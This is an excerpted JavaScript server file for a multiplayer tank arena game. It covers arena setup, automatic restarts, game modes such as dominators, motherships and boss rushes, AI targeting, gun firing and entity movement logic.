...
room.findType("port");
room.nestFoodAmount =
  (1.6 * Math.sqrt(room.nest.length)) / room.xgrid / room.ygrid;
room.random = () => ({
...
room.init = () => {
  ...
  util.log(
    room.width +
      ...
      Math.round(room.maxFood) +
      ". Max nest food: " +
      Math.round(room.maxFood * room.nestFoodAmount) +
      "."
  );
  if (c.restarts.enabled) {
    ...
    setInterval(() => {
      ...
      if (
        room.timeUntilRestart === 1800 ||
        room.timeUntilRestart === 900 ||
        room.timeUntilRestart === 600 ||
        room.timeUntilRestart === 300
      ) {
        if (c.serverName.includes("Boss"))
          sockets.broadcast(
            `WARNING: Tanks have ${
              room.timeUntilRestart / 60
      ...
      if (!room.timeUntilRestart) {
        let reason = c.serverName.includes("Boss")
          ? "Reason: The tanks could only defeat " +
            room.awpBossLevel +
            "/15 bosses"
          : "Reason: Uptime has reached " + totalTime / 60 / 60 + " hours";
        if (c.enableBot)
          sendClosed(
            c.serverName,
            reason,
            "Preparing the server for an automatic restart..."
          );
        util.warn("Automatic server restart initialized! Closing arena...");
        let toAdd = c.serverName.includes("Boss")
          ...
          : "";
        sockets.broadcast(
          toAdd + "Automatic server restart initializing...",
          "#FFE46B"
        );
...
const editStatusMessage = (status) => {
  ...
  if (messageID != null && statusName != null)
    bot.editMessage(
      "442752920174329857",
      messageID,
      `**${statusName}:** ${status}`
...
const spawnBot = (loc = null) => {
  ...
  o.tank = tank;
  o.define(Class[tank]);
  o.define(Class.ditto);
  o.define(Class[tank]);
  o.skill.set([8, 6, 7, 6, 9, 1, 1, 1, 0, 4]);

  o.name = ("[AI] " + ran.chooseBotName()).replace(",", "");
  o.skill.score = 59212;
  o.dangerValue = 7;
  o.nameColor = o.name.includes("Bee")
    ? "#FFF782"
    : o.name.includes("Honey Bee")
    ? "#FCCF3B"
    : o.name.includes("Fallen")
    ? "#CCCCCC"
    : "#C1CAFF";
...
const closeArena = () => {
  ...
  setInterval(() => {
    let alivePlayers = players.filter(
      (player) => player.body != null && player.body.type === "tank"
    );
...
const dominatorLoop = () => {
  ...
  for (let loc of room.domi) {
    ...
    o.onDead = () => {
      ...
      for (let id of Object.keys(doms)) if (doms[id] !== killTeam) wrong++;
      ...
      sockets.broadcast(
        "The " +
          room.cardinals[Math.floor((3 * loc.y) / room.height)][
            Math.floor((3 * loc.x) / room.height)
          ] +
          " Dominator is " +
          (killTeam ? "now captured by " + team : "being contested") +
          "!",
        killTeam ? teamColor : "#FFE46B"
      );
      ...
      if (wrong === 1 && killTeam && !room.arenaClosed) {
        ...
        setTimeout(
          () => sockets.broadcast(team + " has won the game!", teamColor),
          2e3
        );
        if (c.enableBot)
          sendClosed(
            c.serverName,
            "Reason: Round Over",
            team + " has won the game! Closing arena..."
          ); // Considering adding team colors to this
...
const mothershipLoop = (loc, team) => {
  ...
  o.onDead = () => {
    sockets.broadcast(
      teams[team - 1] + "'s Mothership has been killed!",
      teamColors[team - 1]
    );
    if (room.motherships.length !== 1)
      util.remove(room.motherships, room.motherships.indexOf(o));
    if (room.arenaClosed || room.motherships.length !== 1) return;
    util.warn(
      teams[-room.motherships[0].team - 1] +
        " has won the game! Closing arena..."
    );
    setTimeout(
      () =>
        sockets.broadcast(
          teams[-room.motherships[0].team - 1] + " has won the game!",
          teamColors[-room.motherships[0].team - 1]
        ),
      2e3
    );
    if (c.enableBot)
  ...
  switch (room.awpBossLevel) {
    ...
    case 4:
      ...
      setTimeout(() => {
        ...
        o.onDead = onDead;
        sockets.broadcast(
          "Round 4 has begun: " + room.bossString + "!",
          "#FFE46B"
        );
    ...
    case 7:
      ...
      setTimeout(() => {
        ...
        o.onDead = onDead;
        sockets.broadcast(
          "Round 7 has begun: " + room.bossString + "!",
          "#FFE46B"
        );
        util.spawn(`An ${room.bossString} has spawned!`);
      }, 10000);
    ...
    case 8:
      ...
      setTimeout(() => {
        ...
        o.onDead = onDead;
        sockets.broadcast(
          "Round 8 has begun: " + room.bossString + "!",
          "#FFE46B"
        );
        util.spawn(`An ${room.bossString} has spawned!`);
      }, 10000);
    ...
    case 14:
      ...
      setTimeout(() => {
        ...
        o.onDead = onDead;
        sockets.broadcast(
          "Round 14 has begun: " + room.bossString + "!",
          "#FFE46B"
        );
        util.spawn(`An ${room.bossString} has spawned!`);
      }, 10000);
    ...
    default:
      ...
      setTimeout(
        () =>
          sockets.broadcast(
            "The boss rush is over! The tanks have won!",
            "#FFE46B"
          ),
        2e3
      );
      if (c.enableBot)
        sendClosed(
          c.serverName,
          "Reason: Round Over",
          "The tanks have won the boss rush! Closing arena..."
        );
      setTimeout(() => closeArena(), 5e3);
      break;
  }
...
const getEntity = (id) => {
  let entity = null;
  for (let body of entities) if (body.id === id) entity = body;
  return entity;
};
const trimName = (name) =>
  name.replace("\u202E", "").trim() || "An unnamed player";
...
class io_block extends IO {
  constructor(body) {
    super(body);
    this.blockAngle =
      Math.atan2(body.y - body.master.y, body.x - body.master.x) -
      Math.atan2(body.master.control.target.y, body.master.control.target.x);
    if (Math.abs(this.blockAngle) === Infinity) this.blockAngle = 0;
    this.myGoal = {
      x:
        body.master.control.target.x * Math.cos(this.blockAngle) -
        body.master.control.target.y * Math.sin(this.blockAngle) +
        body.master.x,
      y:
        body.master.control.target.x * Math.sin(this.blockAngle) +
        body.master.control.target.y * Math.cos(this.blockAngle) +
        body.master.y,
    };
    this.countdown = 5;
  }
...
class io_triBoomerang extends IO {
  constructor(b) {
    ...
    this.boomAngle =
      Math.atan2(b.y - b.master.y, b.x - b.master.x) -
      Math.atan2(b.master.control.target.y, b.master.control.target.x);
    if (Math.abs(this.boomAngle) === Infinity) this.boomAngle = 0;
    this.myGoal = {
      x:
        3 * b.master.control.target.x * Math.cos(this.boomAngle) -
        3 * b.master.control.target.y * Math.sin(this.boomAngle) +
        b.master.x,
      y:
        3 * b.master.control.target.x * Math.sin(this.boomAngle) +
        3 * b.master.control.target.y * Math.cos(this.boomAngle) +
        b.master.y,
    };
  }
  think(input) {
  ...
  buildList(range) {
    ...
    let out = entities
      .map((o) => {
        if (
          ...
          !o.passive &&
          !isNaN(o.dangerValue) &&
          (this.body.isArenaCloser || o.alpha > 0.2) &&
          o.master.master.team !== this.body.master.master.team &&
          o.master.master.team !== -101 &&
          (o.type === "miniboss" ||
            o.type === "tank" ||
            o.type === "crasher" ||
            (!this.body.aiSettings.IGNORE_SHAPES && o.type === "food")) &&
          Math.abs(o.x - m.x) < range &&
          Math.abs(o.y - m.y) < range &&
          (this.body.aiSettings.BLIND ||
            (Math.abs(o.x - mm.x) < range * 2 &&
              Math.abs(o.y - mm.y) < range * 2))
        )
          return o;
      })
      .filter((o) => o);
    ...
    out = out
      .map((o) => {
        let shoot = false;
        if (
          Math.pow(this.body.x - o.x, 2) + Math.pow(this.body.y - o.y, 2) <
          sqrRange
        ) {
          if (this.body.firingArc == null || this.body.aiSettings.FULL_VIEW)
            shoot = true;
          else if (
            Math.abs(
              util.angleDifference(
      ...
      .filter((o) => {
        if (
          o != null &&
          (this.body.aiSettings.FARMER || o.dangerValue === mostDangerous)
        ) {
  ...
  think(input) {
    ...
    if (this.tick++ > 15 * room.speed) {
      ...
      this.validTargets = this.buildList(
        this.body.isBot ? range * 0.875 : range
      );
...
class io_orion extends IO {
  ...
  think(input) {
    ...
    let dir =
        this.turnwise * util.getDirection(this.body, this.body.source) + 0.01,
      goal = {
...
class io_rlyfastspin2 extends IO {
  constructor(b) {
    ...
    this.b =
      31 * Math.sin(Math.PI * Math.round(-1 + Math.random()) + Math.PI / 2);
  }
  think(input) {
...
const levelers = [
  ...
  23, 24, 25, 26, 27, 28, 29, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 55,
  60,
];
...
class Gun {
  constructor(body, info) {
    ...
    if (PROPERTIES != null && PROPERTIES.TYPE != null) {
      ...
      this.waitToCycle =
        PROPERTIES.WAIT_TO_CYCLE == null ? false : PROPERTIES.WAIT_TO_CYCLE;
      this.countsOwnKids =
        PROPERTIES.MAX_CHILDREN == null ? false : PROPERTIES.MAX_CHILDREN;
      this.syncsSkills =
        PROPERTIES.SYNCS_SKILLS == null ? false : PROPERTIES.SYNCS_SKILLS;
      this.useHealthStats =
        PROPERTIES.USE_HEALTH_STATS == null
          ? false
          : PROPERTIES.USE_HEALTH_STATS;
      this.negRecoil =
        PROPERTIES.NEGATIVE_RECOIL == null ? false : PROPERTIES.NEGATIVE_RECOIL;
      this.destroyOldestChild =
        PROPERTIES.DESTROY_OLDEST_CHILD == null
          ? false
          : PROPERTIES.DESTROY_OLDEST_CHILD;
      this.shootOnDeath =
        PROPERTIES.SHOOT_ON_DEATH == null ? false : PROPERTIES.SHOOT_ON_DEATH;
            ...
            if (gun.shootOnDeath) {
              let gx =
                  ...
                  (1.5 * gun.length - (gun.width * gun.settings.size) / 2) *
                    Math.cos(gun.angle + self.body.facing),
                gy =
                  gun.offset *
                    Math.sin(gun.direction + gun.angle + gun.body.facing) +
                  (1.5 * gun.length - (gun.width * gun.settings.size) / 2) *
                    Math.sin(gun.angle + self.body.facing);
              gun.fire(gx, gy, self.body.skill);
            }
          }
        };
      if (PROPERTIES.COLOR_OVERRIDE != null)
        this.colorOverride = PROPERTIES.COLOR_OVERRIDE;
    }
    if (PROPERTIES != null && PROPERTIES.COLOR != null)
      this.color = PROPERTIES.COLOR;
    if (PROPERTIES != null && PROPERTIES.COLOR_UNMIX != null)
      this.color_unmix = PROPERTIES.COLOR_UNMIX;
    if (PROPERTIES != null && PROPERTIES.SKIN != null)
  ...
  recoil() {
    ...
    if (this.canShoot && !this.body.settings.hasNoRecoil && this.motion > 0) {
      let recoilForce = (-this.position * this.trueRecoil * 0.045) / room.speed;
      this.body.accel.x +=
    ...
    if (this.canShoot) {
      let sk = this.body.skill,
        shootPermission = this.countsOwnKids
          ? this.countsOwnKids >
            this.children.length * (this.calculator === 7 ? sk.rld : 1)
          : this.body.maxChildren
          ? this.body.maxChildren >
            this.body.children.length * (this.calculator === 7 ? sk.rld : 1)
          : true;
      ...
      if (
        ...
        if (this.body.settings.suicidal) {
          if (
            this.body.health.amount < this.body.health.max * 0.6 &&
            this.altFire
          ) {
          ...
          if (this.body.health.amount > this.body.health.max * 0.6) {
            if (
              shootPermission &&
              this.body.control.alt &&
              this.body.health.amount
            ) {
              this.body.health.amount /= 8;
              this.body.shield.amount /= 8;
            }
          }
        }
        if (this.cycle >= 1) {
  ...
  fire(gx, gy, sk) {
    ...
    while (Math.abs(sd) >= 0.5 * this.settings.spray);
    sd *= Math.PI / 180;
    let s = new Vector(
      (this.negRecoil ? -1 : 1) *
        this.settings.speed *
    ...
    let o = new Entity(
      {
        x: this.body.x + this.body.size * gx - 0.75 * this.length * s.x,
        y: this.body.y + this.body.size * gy - 0.75 * this.length * s.y,
      },
      this.master.master
    );
    o.velocity = s;
  ...
  bulletInit(o) {
    ...
    if (this.calculator === 7) o.necro = (host) => {
        let shootPermission = this.countsOwnKids
          ? this.countsOwnKids > this.children.length * this.body.skill.rld
          : this.body.maxChildren
          ? this.body.maxChildren >
        ...
        if (
          shootPermission &&
          host.sanctuaryType === "None" &&
          !host.label.includes("Sanctuary")
        ) {
          let save = {
            facing: host.facing,
            size:
              oo.shape === 5
                ? oo.SIZE + 0.4 * Math.random()
                : host.SIZE > 14
                ? 14
                : host.SIZE,
          };
      ...
      if (this.calculator === 9) o.necro = host => { //rebel
            ...
            if (shootPermission && host.sanctuaryType === "None" && !host.label.includes("Sanctuary")) {
             ...
             //     guns: host.guns,
               //   turrets: host.turrets,
                ...
                host.define(Class.genericEntity);
            //    this.bulletInit(host);
              host.define(Class.bullet)
         //    host.guns = save.guns;
           //   host.turrets = save.turrets;
              host.team = oo.master.master.team;
                host.master = oo.master;
                host.color = oo.color;
              host.motionType = save.mtype;
               host.shape = 0;
             host.velocity.x = -(save.vx);
                 host.velocity.y = -(save.vy);
    
                host.facing = save.facing;
                host.SIZE = save.size; // oo.size
                 host.define({BODY:{DAMAGE: 2 + (host.SIZE / 2), HEALTH: 4}})
...
const dirtyCheck = (p, r) =>
  entitiesToAvoid.some(
    (e) => Math.abs(p.x - e.x) < r + e.size && Math.abs(p.y - e.y) < r + e.size
  );
const purgeEntities = () => {
...
const bringToLife = (() => {
  ...
  return (my) => {
    ...
    if (my.invisible[1]) {
      ...
      if (my.velocity.isShorterThan(my.velocity, 0.15) || my.damageReceived)
...
class Entity {
  ...
  define(set) {
    try {
      ...
      if (set.SUICIDAL != null) this.settings.suicidal = set.SUICIDAL;
      ...
      if (set.NECRO != null) this.settings.isNecromancer = set.NECRO;
          if (set.NECRO2 != null) this.settings.isBulletnecro = set.NECRO2;
      ...
      if (set.BROADCAST_MESSAGE != null)
        this.settings.broadcastMessage = set.BROADCAST_MESSAGE || undefined;
      ...
      if (set.DIES_BY_OBSTACLES != null)
        this.settings.diesByObstacles = set.DIES_BY_OBSTACLES;
      if (set.IS_HELICOPTER != null)
        this.settings.isHelicopter = set.IS_HELICOPTER;
      if (set.GO_THRU_OBSTACLES != null)
        this.settings.goThruObstacle = set.GO_THRU_OBSTACLES;
      if (set.STAT_NAMES != null) this.settings.skillNames = set.STAT_NAMES;
      if (set.HAS_ANIMATION != null)
        this.settings.hasAnimation = set.HAS_ANIMATION;
      ...
      if (set.DIES_TO_TEAM_BASE != null)
        this.diesToTeamBase = set.DIES_TO_TEAM_BASE;
      if (set.GOD_MODE != null) this.godmode = set.GOD_MODE;
      if (set.HAS_NO_SKILL_POINTS != null && set.HAS_NO_SKILL_POINTS)
        this.skill.points = 0;
      if (set.HAS_ALL_SKILL_POINTS != null && set.HAS_ALL_SKILL_POINTS)
      ...
      if (set.SYNC_TURRET_SKILLS != null)
        this.syncTurretSkills = set.SYNC_TURRET_SKILLS;
      ...
      if (set.BOSS_TYPE != null && set.BOSS_TYPE !== "None")
        switch (set.BOSS_TYPE) {
          case "Constellation":
            this.onDead = () => {
              sockets.broadcast(
              ...
              setTimeout(() => {
                ...
                for (let i = 0; i < 4; i++) {
                  ...
                  shard.name = names[i];
                  shard.settings.broadcastMessage =
                ...
                core.name = names[4];
                core.settings.broadcastMessage =
            ...
            this.onDead = () => {
              ...
              setTimeout(() => {
                ...
                for (let i = 0; i < 3; i++) {
                  ...
                  boss.team = -100;
                  boss.define(
                    [Class.guardianAI, Class.summonerAI, Class.defenderAI][i]
                  );
                  boss.name = names[i];
                }
              }, 7500);
          ...
          case "splitSplitSquare":
            this.onDead = () => {
              ...
              for (let i = 0; i < 4; i++) {
                ...
                shape.ACCELERATION = 0.015 / shape.foodLevel;
              }
            };
            break;
          case "summonerSquare":
          ...
          case "squareNest":
            this.onDead = () => {
              ...
              for (let i = 0; i < 4; i++) {
                ...
                shape.team = -100;
                shape.control.target.x =
                  250 * Math.cos((i * Math.PI) / 2 + Math.PI / 4);
                shape.control.target.y =
                  250 * Math.sin((i * Math.PI) / 2 + Math.PI / 4);
          ...
          case "Burnt":
            this.onDead = () => {
              ...
              setTimeout(() => {
                ...
                poly.ACCELERATION = 0.015 / poly.foodLevel;
      ...
      if (set.UPGRADES_TIER_4 != null)
        for (let e of set.UPGRADES_TIER_4)
          this.upgrades.push({
            class: tankList[e.index + room.manualOffset],
            level: 60,
            index: e.index,
      ...
      if (set.CAMERA_TO_MOUSE != null && set.CAMERA_TO_MOUSE !== []) {
        if (set.CAMERA_TO_MOUSE.length !== 2)
      ...
      if (set.RANDOM_TYPE != null && set.RANDOM_TYPE !== "None") {
        ...
        switch (set.RANDOM_TYPE) {
          ...
          case "Pneuma":
            ...
            break;
          case "Rectangmancer":
            choices = [Class.foamBullet, Class.sunchip];
            break;
          case "Workshop":
            choices = [
              Class.pillbox,
      ...
      if (set.ABILITY_IMMUNE != null)
        this.immuneToAbilities = set.ABILITY_IMMUNE;
      if (set.SPAWNS_DECA != null) this.define(Class.decagon);
      if (set.ALWAYS_ACTIVE != null) this.alwaysActive = set.ALWAYS_ACTIVE;
      if (set.MISC_IDENTIFIER != null)
        this.miscIdentifier = set.MISC_IDENTIFIER;
  ...
  refreshBodyAttributes() {
    ...
    this.topSpeed =
      (c.runSpeed *
        (this.settings.reloadToAcceleration ? this.SPEED * 1.05 : this.SPEED) *
        this.skill.mob) /
      speedReduce;
    if (this.settings.reloadToAcceleration)
      this.topSpeed /= Math.sqrt(this.skill.acl);
    this.health.set(
      ((this.settings.healthWithLevel ? 1.5 /* 1.8 */ * this.skill.level : 0) +
        this.HEALTH) *
        (this.settings.reloadToAcceleration
          ? this.skill.hlt * 1.025
          : this.skill.hlt)
    );
    ...
    this.damage =
      this.DAMAGE *
      (this.settings.reloadToAcceleration
        ? this.skill.atk * 1.1 /*1.25*/
        : this.skill.atk);
    this.penetration =
      this.PENETRATION + 1.5 * (this.skill.brst + 0.8 * (this.skill.atk - 1));
    this.range = this.RANGE;
    this.fov =
      250 * this.FOV * Math.sqrt(this.size) * (1 + 0.003 * this.skill.level);
  ...
  bindToMaster(position, bond) {
    ...
    this.bound = {};
    this.bound.size = 0.05 * position[0];
  ...
  camera(tur = false) {
    let out = {
      ...
      twiggle:
        this.facingType === "looseWithMotion" ||
        this.facingType === "smoothWithMotion" ||
        this.facingType === "spinSlowly" ||
        this.facingType === "spinSlowly2" ||
        this.facingType === "spinSlowly3" ||
        this.facingType === "spinSlowly4" ||
        this.facingType === "altSpin" ||
        this.facingType === "fastSpin" ||
        this.facingType === "autospin" ||
        this.facingType === "autospin2" ||
        this.facingType === "reverseAutospin" ||
        this.facingType === "bitFastSpin" ||
        this.facingType === "hadron" ||
        (this.facingType === "locksFacing" && this.control.alt) ||
        this.facingType === "hatchet" ||
        this.facingType === "altLocksFacing" ||
        (this.facingType === "lmg" && this.control.fire),
      layer:
        this.passive && this.LAYER !== -1
          ? 1
          : this.LAYER === -1
          ? this.bond == null
            ? this.type === "wall" || this.type === "mazeWall"
              ? 11
              : this.type === "food"
              ? 10
              : this.type === "tank"
  ...
  upgrade(number) {
    if (
      ...
      if (
        this.switcherooID === 0 ||
        (this.bossTierType !== -1 && this.bossTierType !== 16)
      )
        this.sendMessage(
      ...
      if (this.label === "Acolyte")
        this.sendMessage("Right click to fire a powerful bullet.");

      if (this.settings.hasAnimation === "rmb")
        this.sendMessage(
          "Right click or press shift to use a special ability."
        );
      if (this.settings.hasAnimation === "lmb")
        this.sendMessage("Left click or press space to use a special ability.");
      //if (this.usesAltFire) this.sendMessage("Right click or press shift to fire other weapons.");
      this.sendMessage("You have upgraded to " + this.label + ".");
      for (let o of entities)
        if (
          o.settings.clearOnMasterUpgrade &&
          o.master.id === this.id &&
          o.id !== this.id &&
          o !== this
        )
  ...
  move() {
    ...
    switch (this.motionType) {
      case "glide":
        ...
        break;
               case "rewind":
             if (this.velocity.x < 0.5 && this.velocity.y < 0.5) { if (this.master.control.alt) {this.master.x = this.x; this.master.y = this.y;}}
            //Case fallthrough for rewind    -iris
      ...
      case "motor":
        ...
        break;
      case "clone":
        this.score = this.master.score;
        this.passive = true;
        this.name = this.master.name;
        this.nameColor = this.master.nameColor;
        let speedReduce = Math.pow(this.size / (this.coreSize || this.SIZE), 1);

        this.topSpeed =
          (c.runSpeed *
            (this.master.settings.reloadToAcceleration
              ? this.master.SPEED * 1.05
              : this.master.SPEED) *
            this.master.skill.mob) /
          speedReduce;
        this.maxSpeed = 0;
        if (this.topSpeed) this.damp = a / this.topSpeed;
        if (gactive) {
      ...
      case "metalic":
        ...
        if (this.master.control.alt) {
          ...
          if (this.health.amount < this.health.max) {
            this.health.amount += this.health.max / 100;
          }
          if (this.shield.amount < this.shield.max) {
            this.shield.amount += this.shield.max / 100;
          }
        } else {
          this.topSpeed = 0;
          this.maxSpeed = 1;
      ...
      case "fatNuke":
        ...
        break;
      case "miniGrower":
        this.SIZE += 0.1; // + .02 * Math.random();
        this.DAMAGE += 0.15;
        this.penetration += 0.01;
        if (this.velocity.x > 0) this.velocity.x -= 0.0035;
        if (this.velocity.y > 0) this.velocity.y -= 0.0035;
        break;
      case "grower":
        this.SIZE += 0.14; // + .022 * Math.random();
        this.DAMAGE += 0.175;
        this.penetration += 0.02;
        if (this.velocity.x > 0) this.velocity.x -= 0.004;
        if (this.velocity.y > 0) this.velocity.y -= 0.004;
        break;
      case "megaGrower":
        this.SIZE += 0.17; // + .024 * Math.random();
        this.DAMAGE += 0.2;
        this.penetration += 0.03;
        if (this.velocity.x > 0) this.velocity.x -= 0.0045;
        if (this.velocity.y > 0) this.velocity.y -= 0.0045;
        break;
      case "gigaGrower":
        this.SIZE += 0.21; // + .026 * Math.random();
        this.DAMAGE += 0.225;
        this.penetration += 0.04;
        if (this.velocity.x > 0) this.velocity.x -= 0.005;
        if (this.velocity.y > 0) this.velocity.y -= 0.005;
        break;
      /*case "gravity":
  ...
  face() {
    ...
    switch (this.facingType) {
      ...
      case "fastSpin":
        ...
        break;
      case "altSpin":
        this.facing += (this.master.control.alt ? -0.15 : 0.075) / room.speed;
        break;
      case "hadron":
        this.facing += (this.master.control.alt ? -0.035 : 0.035) / room.speed;
        break;
      case "lmg":
        if (this.master.control.fire) this.facing += 0.0375 / room.speed;
        break;
      case "turnWithSpeed":
  ...
  location() {
    ...
    if (
      ...
      for (let i = 1; i < room.teamAmount + 1; i++)
        if (
          this.team !== -i &&
          (room.isIn(`bas${i}`, loc) || room.isIn(`n_b${i}`, loc))
        ) {
          isInTeamBase = true;
          break;
        }
    ...
    if (
      ...
      if (this.settings.isHelicopter) {
        if (!this.godmode && !this.invuln) this.health.amount -= 0.9;
        return;
      }
      ...
      if (this.type === "miniboss") {
        ...
        if (dist2 <= c.PORTALS.THRESHOLD) {
          ...
          do
            portTo =
              room["port"][Math.floor(Math.random() * room["port"].length)];
          ...
          for (let o of entities)
            if (
              ...
              o.x = portTo.x + 320 * ax + 30 * (Math.random() - 0.5);
              o.y = portTo.y + 320 * ay + 30 * (Math.random() - 0.5);
            }
        } else {
          this.velocity.x -=
            (((c.PORTALS.GRAVITY * dx) / dist2) * force) / room.speed;
          this.velocity.y -=
            (((c.PORTALS.GRAVITY * dy) / dist2) * force) / room.speed;
        }
      } else this.kill();
    }
    if (
      ...
      this.accel.x -=
        (Math.min(this.x - this.realSize + 50, 0) * force) / room.speed;
      this.accel.x -=
        (Math.max(this.x + this.realSize - room.width - 50, 0) * force) /
        room.speed;
      this.accel.y -=
        (Math.min(this.y - this.realSize + 50, 0) * force) / room.speed;
      this.accel.y -=
        (Math.max(this.y + this.realSize - room.height - 50, 0) * force) /
        room.speed;
      if (c.PORTALS.ENABLED && !this.settings.isHelicopter) {
        if (c.PORTALS.DIVIDER_V.ENABLED) {
          ...
          if (this.x > m && this.x < r)
            this.accel.x -=
              (Math.min(this.x - this.realSize + 50 - r, 0) * force) /
              room.speed;
          if (this.x > l && this.x < m)
            this.accel.x -=
              (Math.max(this.x + this.realSize - 50 - l, 0) * force) /
              room.speed;
        }
        if (c.PORTALS.DIVIDER_H.ENABLED) {
          ...
          if (this.y > m && this.y < r)
            this.accel.y -=
              (Math.min(this.y - this.realSize + 50 - r, 0) * force) /
              room.speed;
          if (this.y > l && this.y < m)
            this.accel.y -=
              (Math.max(this.y + this.realSize - 50 - l, 0) * force) /
              room.speed;
        }
      }
    }
        ...
        if (notJustFood) {
          ...
          if (killers[0] != null) {
            if (killers[0].isArenaCloser)
              usurptText += ` suffered by the hands of ${util.addArticle(
                killers[0].label
              )}.`;
            else if (killers[0].label.includes("Base Protector"))
              usurptText += " strayed too close to a Base Protector.";
            else
              usurptText += ` fought ${util.addArticle(
                killers[0].label
              )}, and the ${killers[0].label} won.`;
  ...
  toggleRainbow() {
    ...
    if (this.rainbow)
      this.intervalID = setInterval(this.rainbowLoop, this.rainbowSpeed);
  ...
  multiboxLoop() {
    ...
    for (let controlledBody of this.multibox.controlledTanks)
      if (controlledBody.isAlive()) {
        ...
        if (controlledBody.tank !== this.tank)
          controlledBody.upgradeTank(this.tank);
        controlledBody.tank = this.tank;
        controlledBody.FOV = 0.1;
        ...
        controlledBody.layer = this.layer - 0.5;
  ...
  relinquish(player) {
    if (player.body.isMothership) {
      ...
      player.body.controllers = [
        new io_nearestDifferentMaster(player.body),
        new io_spinWhileIdle(player.body),
      ];
    ...
    switch (onShoot) {
      ...
      case "exteng2":
        for (let i = 1; i < 41; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`exteng${onShoot === "exteng" ? i : 40 - i}`]);
          }, 28 * i);
        break;
      case "hepta":
      case "hepta2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[`heptazoid${onShoot === "hepta" ? i : 31 - i}`]
              );
          }, 7 * i);
        break;
      case "sab":
      case "sab2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`sab${onShoot === "sab" ? i : 30 - i}`]);
          }, 14 * i);
        break;
      case "ek":
      case "ek2":
        for (let i = 1; i < 102; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`ekAnim${onShoot === "ek" ? i : 101 - i}`]);
          }, 36 * i);
        break;
      case "nok":
      case "nok2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`nok${onShoot === "nok" ? i : 30 - i}`]);
          }, 14 * i);
        break;
      case "tam":
      case "tam2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`tam${onShoot === "tam" ? i : 30 - i}`]);
          }, 14 * i);
        break;
      case "hand":
      case "hand2":
      ...
      case "bite2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`bite${onShoot === "bite" ? i : 30 - i}`]);
          }, 14 * i);
        break;
      case "mar":
      case "mar2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`mar${onShoot === "mar" ? i : 30 - i}`]);
          }, 14 * i);
        break;
      case "zke":
      case "zke2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`zke${onShoot === "zke" ? i : 31 - i}`]);
          }, 14 * i);
        break;
      case "val":
      case "val2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`val${onShoot === "val" ? i : 31 - i}`]);
          }, 14 * i);
        break;
      case "inject":
        setTimeout(() => {
      ...
      case "steyr2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`steyr${onShoot === "steyr" ? i : 31 - i}`]);
          }, 14 * i);
        break;
      case "cas":
      case "cas2":
        for (let i = 1; i < 49; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`castano${onShoot === "cas" ? i : 48 - i}`]);
          }, 28 * i);
        break;
      case "redis":
      case "redis2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`trired${onShoot === "redis" ? i : 31 - i}`]);
          }, 14 * i);
        break;
      case "engi":
      case "engi2":
        ...
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`engilord${onShoot === "engi" ? i : 31 - i}`]);
          }, 28 * i);
        break;
      case "hybranger":
      case "hybranger2":
          ...
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[
                  `hybranger${
                    onShoot === "hybranger" ? i : i === 31 ? 0 : i + 31
                  }`
                ]
              );
          }, 14 * i);
      ...
      case "stick2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`stick${onShoot === "stick" ? i : 31 - i}`]);
          }, 14 * i);
        break;
      case "what":
        for (let i = 1; i < 16; i++)
      ...
      case "what3":
        for (let i = 32; i < 63; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`whatever${i === 62 ? 0 : i}`]);
          }, 14 * (i - 31));
        break;
      case "shape":
      case "shape2":
        ...
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[`shapeChange${onShoot === "shape" ? i : 31 - i}`]
              );
          }, 14 * i);
        break;
      case "misi":
      case "misi2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`misitor${onShoot === "misi" ? i : 31 - i}`]);
          }, 14 * i);
        break;
      case "surge":
      case "surge2":
        for (let i = 1; i < 21; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[`sniperEMP${onShoot === "surge" ? i : 20 + i}`]
              );
      ...
      case "led2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[`ledZeppelin${onShoot === "led" ? i : 31 - i}`]
              );
          }, 14 * i);
        break;
      case "extend":
      case "extend2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[`basicRanger${onShoot === "extend" ? i : 30 - i}`]
              );
          }, 18 * i);
        break;
      case "par":
      case "par2":
        for (let i = 1; i < 31; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(Class[`par${onShoot === "par" ? i : 30 - i}`]);
          }, 14 * i);
        break;
      case "penta":
      case "penta2":
        for (let i = 1; i < 32; i++)
          setTimeout(() => {
            if (this.isAlive())
              this.define(
                Class[`pentaBoost${onShoot === "penta" ? i : 31 - i}`]
              );
          }, 14 * i);
        break;
      default:
...
const IPv4BadASNBlocks = fs
  .readFileSync("./lib/database/GeoLite2-ASN-Blocks-IPv4.csv", "utf8")
  .trim()
  .split("\n")
  .slice(1)
  .map((line) => {
...
const exportDefintionsToClient = (() => {
  ...
  let data = [];
  for (let k of Object.keys(Class))
    try {
      let temp = Class[k],
        o = new Entity({
          x: 0,
...
